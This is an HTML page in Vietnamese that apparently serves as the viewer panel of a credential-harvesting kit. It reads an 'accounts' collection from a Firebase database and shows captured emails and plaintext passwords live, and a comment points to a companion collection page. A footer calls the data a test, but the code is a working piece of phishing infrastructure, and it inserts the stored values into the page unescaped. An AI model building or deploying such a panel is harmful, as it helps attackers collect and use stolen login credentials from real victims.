<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <title>Lutrugg - Kho Lưu Trữ</title>
  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
    import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

    const firebaseConfig = {
      // copy y chang config ở file trên
      apiKey: "AIzaSy...thay bằng apiKey thật...",
      authDomain: "quocdat-sec.firebaseapp.com",
      databaseURL: "https://quocdat-sec-default-rtdb.firebaseio.com",
      projectId: "quocdat-sec",
      storageBucket: "quocdat-sec.appspot.com",
      messagingSenderId: "...",
      appId: "..."
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    const accountsRef = ref(db, 'accounts');

    onValue(accountsRef, (snapshot) => {
      const data = snapshot.val();
      const list = document.getElementById('accounts-list');
      list.innerHTML = '';

      if (data) {
        Object.keys(data).forEach(key => {
          const item = data[key];
          const div = document.createElement('div');
          div.style.margin = '20px 0';
          div.style.padding = '15px';
          div.style.background = 'rgba(0,255,157,0.1)';
          div.style.border = '1px solid #00ff9d';
          div.style.borderRadius = '8px';
          div.innerHTML = `
            <p><strong>Email:</strong> ${item.email || 'N/A'}</p>
            <p><strong>Mật khẩu:</strong> ${item.password || 'N/A'}</p>
            <p><strong>Thời gian:</strong> ${item.timestamp ? new Date(item.timestamp).toLocaleString('vi-VN') : 'N/A'}</p>
            <hr style="border-color:#444;">
          `;
          list.appendChild(div);
        });
      } else {
        list.innerHTML = '<p style="color:#aaa;">Chưa có tài khoản nào được lưu.</p>';
      }
    });
  </script>

  <style>
    body { background:#0d001a; color:#00ff9d; font-family:monospace; padding:30px; }
    .container { max-width:900px; margin:auto; background:rgba(10,0,30,0.9); padding:30px; border:1px solid #00ff9d; border-radius:12px; }
    h1 { color:#ff00aa; text-align:center; text-shadow:0 0 10px #ff00aa; }
    #accounts-list div { margin:20px 0; }
    p { margin:8px 0; }
  </style>
</head>
<body>
  <div class="container">
    <h1>LUTRUGG STORAGE</h1>
    <p style="text-align:center; color:#aaa;">Danh sách tài khoản đã lưu (real-time)</p>

    <div id="accounts-list" style="margin-top:30px;">
      <p>Đang tải dữ liệu...</p>
    </div>

    <p style="text-align:center; color:#ff3366; font-weight:bold; margin-top:50px;">
      CẢNH BÁO: Đây là dữ liệu nhạy cảm! Không dùng mật khẩu thật. Chỉ test thôi.
    </p>
  </div>
</body>
</html>
